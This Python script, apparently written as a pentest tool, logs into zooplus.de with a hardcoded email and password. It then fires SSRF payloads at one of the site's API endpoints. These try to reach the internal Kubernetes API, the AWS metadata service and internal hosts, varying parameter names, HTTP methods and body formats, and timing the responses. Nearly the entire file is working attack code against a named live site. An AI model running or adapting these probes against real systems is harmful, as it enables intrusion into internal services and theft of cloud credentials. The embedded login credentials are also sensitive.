#!/usr/bin/env python3
"""Detailed SSRF test - try to get real response"""
import requests
import json
import re
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "*/*",
})

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

ssrf_endpoint = "/zootopia-events/api/events/sites/1"

print("="*70)
print("DETAILED SSRF TEST - Try to get real Kubernetes response")
print("="*70)

# Test 1: Check if endpoint accepts different parameters
print("\n[1] Testing different parameter names...")
test_params = [
    {"url": "https://kubernetes.default.svc/api/v1/namespaces/default/pods"},
    {"endpoint": "https://kubernetes.default.svc/api/v1/namespaces/default/pods"},
    {"target": "https://kubernetes.default.svc/api/v1/namespaces/default/pods"},
    {"callback": "https://kubernetes.default.svc/api/v1/namespaces/default/pods"},
    {"request_url": "https://kubernetes.default.svc/api/v1/namespaces/default/pods"},
    {"api_url": "https://kubernetes.default.svc/api/v1/namespaces/default/pods"},
]

for params in test_params:
    try:
        resp = s.post(f"{base}{ssrf_endpoint}", json=params, timeout=5, verify=False)
        print(f"  {list(params.keys())[0]}: Status {resp.status_code}, Response: {resp.text[:50]}")
        if len(resp.text) > 2 or "items" in resp.text or "kind" in resp.text:
            print(f"    [POTENTIAL] Non-empty response!")
    except: pass

# Test 2: Try with different HTTP methods
print("\n[2] Testing different HTTP methods...")
for method in ["GET", "PUT", "PATCH"]:
    try:
        resp = s.request(method, f"{base}{ssrf_endpoint}", json={"url": "https://kubernetes.default.svc/api/v1/namespaces/default/pods"}, timeout=5, verify=False)
        print(f"  {method}: Status {resp.status_code}, Response: {resp.text[:50]}")
    except: pass

# Test 3: Try with query parameters
print("\n[3] Testing with query parameters...")
try:
    resp = s.post(f"{base}{ssrf_endpoint}?url=https://kubernetes.default.svc/api/v1/namespaces/default/pods", json={}, timeout=5, verify=False)
    print(f"  Query param: Status {resp.status_code}, Response: {resp.text[:50]}")
except: pass

# Test 4: Try with form data
print("\n[4] Testing with form data...")
try:
    resp = s.post(f"{base}{ssrf_endpoint}", data={"url": "https://kubernetes.default.svc/api/v1/namespaces/default/pods"}, timeout=5, verify=False)
    print(f"  Form data: Status {resp.status_code}, Response: {resp.text[:50]}")
except: pass

# Test 5: Check response headers for clues
print("\n[5] Checking response headers...")
try:
    resp = s.post(f"{base}{ssrf_endpoint}", json={"url": "https://kubernetes.default.svc/api/v1/namespaces/default/pods"}, timeout=5, verify=False)
    print(f"  Headers:")
    for key, value in resp.headers.items():
        if any(x in key.lower() for x in ["location", "x-", "server", "kubernetes", "k8s"]):
            print(f"    {key}: {value}")
except: pass

# Test 6: Try to access metadata service (should be accessible from inside)
print("\n[6] Testing AWS metadata service (should work from inside)...")
try:
    resp = s.post(f"{base}{ssrf_endpoint}", json={"url": "http://169.254.169.254/latest/meta-data/"}, timeout=5, verify=False)
    print(f"  Metadata: Status {resp.status_code}, Response: {resp.text[:200]}")
    if len(resp.text) > 2:
        print(f"    [SUCCESS] Got metadata response!")
except: pass

# Test 7: Try internal services
print("\n[7] Testing internal services...")
internal_services = [
    "http://127.0.0.1:8080",
    "http://localhost:8080",
    "http://10.96.0.1",
]
for service in internal_services:
    try:
        resp = s.post(f"{base}{ssrf_endpoint}", json={"url": service}, timeout=3, verify=False)
        print(f"  {service}: Status {resp.status_code}, Response length: {len(resp.text)}")
        if len(resp.text) > 2:
            print(f"    [POTENTIAL] Non-empty response: {resp.text[:100]}")
    except: pass

# Test 8: Compare response time (K8s API should be slower)
print("\n[8] Testing response times (K8s should be slower)...")
import time

test_urls = [
    ("https://kubernetes.default.svc/api/v1/namespaces/default/pods", "K8s API"),
    ("https://httpbin.org/get", "External"),
    ("https://www.google.com", "External"),
]

for url, name in test_urls:
    try:
        start = time.time()
        resp = s.post(f"{base}{ssrf_endpoint}", json={"url": url}, timeout=10, verify=False)
        elapsed = time.time() - start
        print(f"  {name}: {elapsed:.2f}s, Status: {resp.status_code}")
    except Exception as e:
        print(f"  {name}: Error - {e}")

print("\n" + "="*70)
print("Done!")





